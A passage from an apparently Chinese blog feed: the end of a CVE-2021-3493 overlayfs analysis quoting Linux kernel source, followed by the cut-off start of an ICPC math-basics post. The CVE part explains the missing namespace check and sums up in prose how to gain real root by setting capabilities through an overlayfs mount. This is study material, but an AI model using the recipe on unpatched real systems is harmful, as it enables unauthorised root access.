class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">current_chrooted</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* Does the current process have a non-standard root */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">ns_root</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">fs_root</span>;</span></span><br><span class="line"><span class="keyword">bool</span> chrooted;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Find the namespace root */</span></span><br><span class="line">ns_root.mnt = &amp;current-&gt;nsproxy-&gt;mnt_ns-&gt;root-&gt;mnt;</span><br><span class="line">ns_root.dentry = ns_root.mnt-&gt;mnt_root;</span><br><span class="line">path_get(&amp;ns_root);</span><br><span class="line"><span class="keyword">while</span> (d_mountpoint(ns_root.dentry) &amp;&amp; follow_down_one(&amp;ns_root))</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">get_fs_root(current-&gt;fs, &amp;fs_root);</span><br><span class="line"></span><br><span class="line">chrooted = !path_equal(&amp;fs_root, &amp;ns_root);</span><br><span class="line"></span><br><span class="line">path_put(&amp;fs_root);</span><br><span class="line">path_put(&amp;ns_root);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> chrooted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释以及关键的语句 <code>chrooted = !path_equal(&amp;fs_root, &amp;ns_root);</code> 我们大概也能猜测出来，它应该就是判断 <code>namespace</code> 的根目录是否于文件系统一致，一致才允许你创建这个 <code>namespace</code>。</p><h5 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h5><p><img src="/2022/08/31/CVE-2021-3493/15.png" alt="15"></p><p>然后在这里需要判断一下属主和数组是否映映射到了父 <code>namespace</code> 上。</p><p>后面的话基本上和我们复现的漏洞无关了，我们这么来了解了一下构成形式，<code>namespace</code> 确实是树状图形式，而且下面我们很清楚地能看到 <code>ns-&gt;level=parent_ns-&gt;level+1</code>。</p><h3 id="权限设置"><a href="#权限设置" class="headerlink" title="权限设置"></a>权限设置</h3><p>这里我们来查看对应版本的代码，<a href="https://elixir.bootlin.com/linux/v4.14.291/source/fs/xattr.c">链接贴上</a>。</p><p>先来看到 <code>416</code> 行，对 <code>setxattr</code> 函数进行分析，这里解释一下 <code>setxattr</code> 的一个名字由来（自己意淫的，非官方说法，经供参考），<code>set</code> 就是设置， <code>x</code> 其实它可以代表 <code>extended</code> 扩展的，<code>attr</code> 就是属性了，连起来就是<strong>设置扩展属性</strong>，这里的扩展属性就是指 <code>capability</code>。其实我感觉吧， <code>x</code> 好像能表示一切 <code>ex</code> 开头的单词，比如我们经常见到的三个权限位，用 <code>x</code> 标识 <code>execute</code>。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Extended attribute SET operations</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"><span class="keyword">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">error = strncpy_from_user(kname, name, <span class="keyword">sizeof</span>(kname));</span><br><span class="line"><span class="keyword">if</span> (error == <span class="number">0</span> || error == <span class="keyword">sizeof</span>(kname))</span><br><span class="line">error = -ERANGE;</span><br><span class="line"><span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size) &#123;</span><br><span class="line"><span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)</span><br><span class="line"><span class="keyword">return</span> -E2BIG;</span><br><span class="line">kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!kvalue)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line">error = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">    (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line">posix_acl_fix_xattr_from_user(kvalue, size);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(kname, XATTR_NAME_CAPS) == <span class="number">0</span>) &#123;</span><br><span class="line">error = cap_convert_nscap(d, &amp;kvalue, size);</span><br><span class="line"><span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">size = error;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error = vfs_setxattr(d, kname, kvalue, size, flags);</span><br><span class="line">out:</span><br><span class="line">kvfree(kvalue);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>乍一看逻辑有点小复杂，主要是很多的宏定义和很多没见过的函数，也不太能够望文生义，于是我找到了Linux手册对于 <code>setxattr</code> 的说明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$man 2 setxattr</span><br></pre></td></tr></table></figure><blockquote><p>setxattr()  sets the value of the extended attribute identified by name and associated with the given path in the filesystem.  The  size  argument  specifies  the  size  (in bytes) of value; a zero-length value is permitted.</p></blockquote><p>貌似介绍的也比较笼统，还是靠自己试试吧。</p><h4 id="part1-1"><a href="#part1-1" class="headerlink" title="part1"></a>part1</h4><p><code>flags &amp; ~(XATTR_CREATE|XATTR_REPLACE)</code>，这其实是很常见的掩码写法，差不多意思就是 <code>flag</code> 标志只在 <code>create</code> 和 <code>replace</code> 位上设置，如果设置了其它位则退出。</p><p><code>strncpy_from_user(kname, name, sizeof(kname))</code> 对传入的 <code>name</code> 参数进行拷贝，拷贝到了 <code>kname</code> 也就是内核栈当中。第一个判断应该是判断空字符串和防止溢出，因为如果 <code>sizeof(kname)</code> 字节都被占满了那么这个字符串还会跟下面连续的字符串相连，造成一些错误。</p><p>这里出现了我的知识盲区，这里也来解释一下，在内核里面，看见全大写字母的变量基本都不是变量，都是宏定义。而我实在不知道字符串常量有直接拼接的做法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> s1 <span class="meta-string">&quot;123&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> s2 <span class="meta-string">&quot;456&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> s3 s1 s2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(s3);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*output: </span></span><br><span class="line"><span class="comment">123456</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>我还以为是宏定义的特殊写法呢，这里mark一下。</p><p>这里给出这些宏定义的最终结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XATTR_NAME_POSIX_ACL_ACCESS <span class="meta-string">&quot;system.posix_acl_access&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XATTR_NAME_POSIX_ACL_DEFAULT <span class="meta-string">&quot;system.posix_acl_default&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XATTR_NAME_CAPS <span class="meta-string">&quot;security.capability&quot;</span></span></span><br></pre></td></tr></table></figure><p>那么第一个 <code>if</code> 我们 <code>duck</code> 不必关心，我们主要关心第二个跟 <code>capability</code> 相关的分支。</p><p>我们具体逻辑也不进一步分析了，我们就看看这个函数给的注释：</p><p><code>This function will then take care to map the inode according to @mnt_userns before checking permissions.</code></p><p>我们也不难看出来，在检查权限之前就是会对文件系统和 <code>user namespace </code> 进行映射，这个函数叫 <code>cap_convert_nscap</code>，那其实就是对 <code>capability</code> 的 <code>userns</code> 进行一个映射了（应该是这个意思。</p><p>就是可能，它会在不同的 <code>namespace</code> 上嘛，比如这个文件夹是其中一个 <code>user namespace</code> 创建的，不可能我换一个 <code>namespace</code> 去检测权限也是相同的手法，肯定是要把权限映射一下的，映射到同一个 <code>namespace</code> 上才能进行权限检查。</p><p>经过一系列检查之后，走到了 <code>vfs_setxattr</code>，也就是虚拟文件系统的扩展属性设置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfs_setxattr</span><span class="params">(struct dentry *dentry, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> dentry-&gt;d_inode;</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">error = xattr_permission(inode, name, MAY_WRITE);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">inode_lock(inode);</span><br><span class="line">error = security_inode_setxattr(dentry, name, value, size, flags);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = __vfs_setxattr_noperm(dentry, name, value, size, flags);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">inode_unlock(inode);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一条不深入挖下去了，就是判断有没有写的权限，然后上锁，防止发生竞争，然后进行 <code>security_inode_setxattr</code> 函数进行进一步的权限校验，最后执行 <code>__vfs_setxattr_noperm</code> 函数，它的后缀 <code>noperm</code> 就是还没有进行权限检查的 <code>__vfs_setxattr</code> 与我们之前说的分析思路是一致的。在这个函数里面有一个大 <code>if</code> 判断文件是否有权限，最终调用一个 <code>__vfs_setxattr</code> 去真实设置 <code>xattr</code>。</p><p>因此我们可以发现，在调用设置文件扩展属性时候，会有一系列的检查，比如你是否是 <code>root</code>，你对文件操作是否有权限之类的，因为即使你是 <code>root</code> 也得看看那个文件系统的权限是否归你所有，有可能是其它 <code>user_namespace</code> 的用户创建的，那么你有可能也是没有权限的，这个地方是不会出现越权行为的。</p><p>然后我们看到 <code>overlayfs</code> 的设置文件扩展属性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ovl_xattr_set</span><span class="params">(struct dentry *dentry, struct inode *inode, <span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> <span class="keyword">void</span> *value, <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">upperdentry</span> =</span> ovl_i_dentry_upper(inode);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">realdentry</span> =</span> upperdentry ?: ovl_dentry_lower(dentry);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old_cred</span>;</span></span><br><span class="line"></span><br><span class="line">err = ovl_want_write(dentry);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!value &amp;&amp; !upperdentry) &#123;</span><br><span class="line">err = vfs_getxattr(realdentry, name, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_drop_write;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!upperdentry) &#123;</span><br><span class="line">err = ovl_copy_up(dentry);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> out_drop_write;</span><br><span class="line"></span><br><span class="line">realdentry = ovl_dentry_upper(dentry);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">old_cred = ovl_override_creds(dentry-&gt;d_sb);</span><br><span class="line"><span class="keyword">if</span> (value)</span><br><span class="line">err = vfs_setxattr(realdentry, name, value, size, flags);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">WARN_ON(flags != XATTR_REPLACE);</span><br><span class="line">err = vfs_removexattr(realdentry, name);</span><br><span class="line">&#125;</span><br><span class="line">revert_creds(old_cred);</span><br><span class="line"></span><br><span class="line">out_drop_write:</span><br><span class="line">ovl_drop_write(dentry);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;<span class="comment">///fs/overlayfs/inode.c</span></span><br></pre></td></tr></table></figure><p>其它的我们不看，我们解释比较容易理解的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!upperdentry) &#123;</span><br><span class="line">    err = ovl_copy_up(dentry);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> out_drop_write;</span><br><span class="line"></span><br><span class="line">    realdentry = ovl_dentry_upper(dentry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个地方其实就是我们说的，如果文件在 <code>lower</code> 当中，那么拷贝一份到 <code>upper</code> 当中去，然后把新的文件节点指向 <code>upper</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (value)</span><br><span class="line">err = vfs_setxattr(realdentry, name, value, size, flags);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">WARN_ON(flags != XATTR_REPLACE);</span><br><span class="line">err = vfs_removexattr(realdentry, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接调用 <code>vfs_setxattr</code> 函数了，我们知道在 <code>vfs_setxattr</code> 之前有一个入口，也就是 <code>setxattr</code> 这个地方会有一个调用，调用 <code>cap_convert_nscap</code> 函数去检查  <code>user namespace</code> 是否一致。而这里直接调用 <code>vfs_setxattr</code> 这个函数就绕过了 <code>namespace</code> 的检查。</p><p>所以我们之前的利用步骤就是先创建了一个 <code>namespace</code>，然后挂载了一个 <code>overlayfs</code>，在 <code>merge</code> 文件夹中是我们创建的 <code>fs namespace</code>，因此我们创建的 <code>root</code> 用户对这个 <code>fs namespace</code> 有设置 <code>capability</code> 的操作权限，这个其实没有问题，因为我即使运行了这个 <code>a.out</code> 也不会有真正的 <code>root</code> 权限，有的只是我们创建的这个 <code>user namespace</code> 的 <code>root</code> 权限，而这个权限实际是 <code>init</code> 的 <code>user</code> 创建的，因此实际操作还是获得不了真实的 <code>root</code>，但是问题就是 <code>overlayfs</code> 的这个特性：我们修改了 <code>merge</code> 中的 <code>a.out</code> 会反向修改之前在 <code>upper</code> 中的 <code>a.out</code>，因此我们给它 <code>setuid</code> 的权限导致了 <code>upper/a.out</code> 也有 <code>setuid</code> 的权限，而 <code>upper/a.out</code> 是在实际的 <code>init user namespace</code> 创建的，因此它有了 <code>init user namespace</code> 的 <code>setuid</code> 权限。我们运行 <code>upper/a.out</code> 直接获取真实 <code>root</code> 权限。</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>这个其实我个人认为应该是 <code>overlayfs</code> 的问题，在修改的时候应该检查 <code>user namespace</code> 才对，但是它修改了 <code>xattr.c</code> 中的 <code>vfs_setxattr</code> 函数，这个函数重新用了一个 <code>cap_convert_nscap</code> 函数检查 <code>namespace</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v5.19.6/source/fs/xattr.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfs_setxattr</span><span class="params">(struct user_namespace *mnt_userns, struct dentry *dentry,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">void</span> *value, <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> dentry-&gt;d_inode;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">delegated_inode</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>  *orig_value = value;</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &amp;&amp; <span class="built_in">strcmp</span>(name, XATTR_NAME_CAPS) == <span class="number">0</span>) &#123;</span><br><span class="line">error = cap_convert_nscap(mnt_userns, dentry, &amp;value, size);<span class="comment">//这里是新增的namespace检查</span></span><br><span class="line"><span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">size = error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">retry_deleg:</span><br><span class="line">inode_lock(inode);</span><br><span class="line">error = __vfs_setxattr_locked(mnt_userns, dentry, name, value, size,</span><br><span class="line">      flags, &amp;delegated_inode);</span><br><span class="line">inode_unlock(inode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (delegated_inode) &#123;</span><br><span class="line">error = break_deleg_wait(&amp;delegated_inode);</span><br><span class="line"><span class="keyword">if</span> (!error)</span><br><span class="line"><span class="keyword">goto</span> retry_deleg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (value != orig_value)</span><br><span class="line">kfree(value);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这样也能完成漏洞的修复，不过我认为在其它文件系统中这里检查了两次就比较没有必要，也是比较困惑的点吧，也可能防止其它文件系统调用这个函数也没有检查，大概是这样的。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> CVE </category>
          
          <category> 2021-3493 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>icpc数学基础</title>
      <link href="/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>来学学数学啦。    </p><span id="more"></span><h1 id="数学基础"><a href="#数学基础" class="headerlink" title="数学基础"></a>数学基础</h1><p>计算机科学与数学紧密相关，而在算法竞赛中尤其强调以数论、排列组合、概率期望、多项式为代表离散、具体的数学：其注重程序实现和现实问题，可以出现在几乎任何类别的题目中。</p><h2 id="算法竞赛中的常见符号"><a href="#算法竞赛中的常见符号" class="headerlink" title="算法竞赛中的常见符号"></a>算法竞赛中的常见符号</h2><p>以下摘自wiki</p><h3 id="整除-同余理论常见符号"><a href="#整除-同余理论常见符号" class="headerlink" title="整除/同余理论常见符号"></a>整除/同余理论常见符号</h3><ol><li>整除符号：$x\mid y$，表示 $x$ 整除 $y$，即 $x$ 是 $y$ 的因数。</li><li>取模符号：$x\bmod y$，表示 $x$ 除以 $y$ 得到的余数。</li><li>互质符号：$x\perp y$，表示 $x$，$y$ 互质。</li><li>最大公约数：$\gcd(x,y)$，在无混淆意义的时侯可以写作 $(x,y)$。</li><li>最小公倍数：$\operatorname{lcm}(x,y)$，在无混淆意义的时侯可以写作 $[x,y]$。</li></ol><h3 id="数论函数常见符号"><a href="#数论函数常见符号" class="headerlink" title="数论函数常见符号"></a>数论函数常见符号</h3><p>求和符号：$\sum$ 符号，表示满足特定条件的数的和。举几个例子：</p><ul><li>$\sum_{i=1}^n i$ 表示 $1+2+\dotsb+n$ 的和。其中 $i$ 是一个变量，在求和符号的意义下 $i$ 通常是 <strong>正整数或者非负整数</strong>（除非特殊说明）。这个式子的含义可以理解为，$i$ 从 $1$ 循环到 $n$，所有 $i$ 的和。这个式子用代码的形式很容易表达。当然，学过简单的组合数学的同学都知道 $\sum_{i=1}^n i=\dfrac{n(n+1)}{2}$。</li><li>$\sum_{S\subseteq T}|S|$ 表示所有被 $T$ 包含的集合的大小的和。</li><li>$\sum_{p\le n,p\perp n}1$ 表示的是 $n$ 以内有多少个与 $n$ 互质的数，即 $\varphi(n)$，$\varphi$ 是欧拉函数。</li></ul><p>求积符号：$\prod$ 符号，表示满足特定条件的数的积。举几个例子：</p><ul><li>$\prod_{i=1}^ni$ 表示 $n$ 的阶乘，即 $n!$。在组合数学常见符号中会讲到。</li><li>$\prod_{i=1}^na_i$ 表示 $a_1\times a_2\times a_3\times \dotsb\times a_n$。</li><li>$\prod_{x|d}x$ 表示 $d$ 的所有因数的乘积。</li></ul><p>在行间公式中，求和符号与求积符号的上下条件会放到符号的上面和下面，这一点要注意。</p><h3 id="其他常见符号"><a href="#其他常见符号" class="headerlink" title="其他常见符号"></a>其他常见符号</h3><ol><li>阶乘符号 $!$，$n!$ 表示 $1\times 2\times 3\times \dotsb \times n$。特别地，$0!=1$。</li><li>向下取整符号：$\lfloor x\rfloor$，表示小于等于 $x$ 的最大的整数。常用于分数，比如分数的向下取整 $\left\lfloor\dfrac{x}{y}\right\rfloor$。</li><li>向上取整符号：$\lceil x\rceil$，与向下取整符号相对，表示大于等于 $x$ 的最小的整数。</li></ol><h2 id="位运算基础"><a href="#位运算基础" class="headerlink" title="位运算基础"></a>位运算基础</h2><p>位运算就是基于整数的二进制表示进行的运算。由于计算机内部就是以二进制来存储数据，位运算是相当快的。</p><p>基本的位运算共 $6$ 种，分别为按位与、按位或、按位异或、按位取反、左移和右移。</p><h3 id="与、或、异或"><a href="#与、或、异或" class="headerlink" title="与、或、异或"></a>与、或、异或</h3><p>这三者都是两数间的运算，因此在这里一起讲解。</p><p>它们都是将两个整数作为二进制数，对二进制表示中的每一位逐一运算。</p><table><thead><tr><th>运算</th><th align="center">运算符</th><th>数学符号表示</th><th align="center">解释</th></tr></thead><tbody><tr><td>与</td><td align="center"><code>&amp;</code></td><td>$&amp;$、$\operatorname{and}$</td><td align="center">只有两个对应位都为 $1$ 时才为 $1$</td></tr><tr><td>或</td><td align="center">`</td><td>`</td><td align="center">$\mid$、$\operatorname{or}$</td></tr><tr><td>异或</td><td align="center"><code>^</code></td><td>$\oplus$、$\operatorname{xor}$</td><td align="center">只有两个对应位不同时才为 $1$</td></tr></tbody></table><p>注意区分逻辑与（对应的数学符号为 $\wedge$）和按位与、逻辑或（$\vee$）和按位或的区别。网络中的资料中使用的符号多有不规范之处，以上下文为准。</p><p>异或运算的逆运算是它本身，也就是说两次异或同一个数最后结果不变，即 $a \oplus b \oplus b = a$ 。</p><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>取反是对一个数 $num$ 进行的位运算，即单目运算。</p><p>取反暂无默认的数学符号表示，其对应的运算符为 <code>~</code>。它的作用是把 $num$ 的二进制补码中的 $0$ 和 $1$ 全部取反（$0$ 变为 $1$，$1$ 变为 $0$）。有符号整数的符号位在 <code>~</code> 运算中同样会取反。</p><p>补码：在二进制表示下，正数和 $0$ 的补码为其本身，负数的补码是将其对应正数按位取反后加一</p><h3 id="左移和右移"><a href="#左移和右移" class="headerlink" title="左移和右移"></a>左移和右移</h3><p> <code>num &lt;&lt; i</code> 表示将 $num$ 的二进制表示向左移动 $i$ 位所得的值。</p><p> <code>num &gt;&gt; i</code> 表示将 $num$ 的二进制表示向右移动 $i$ 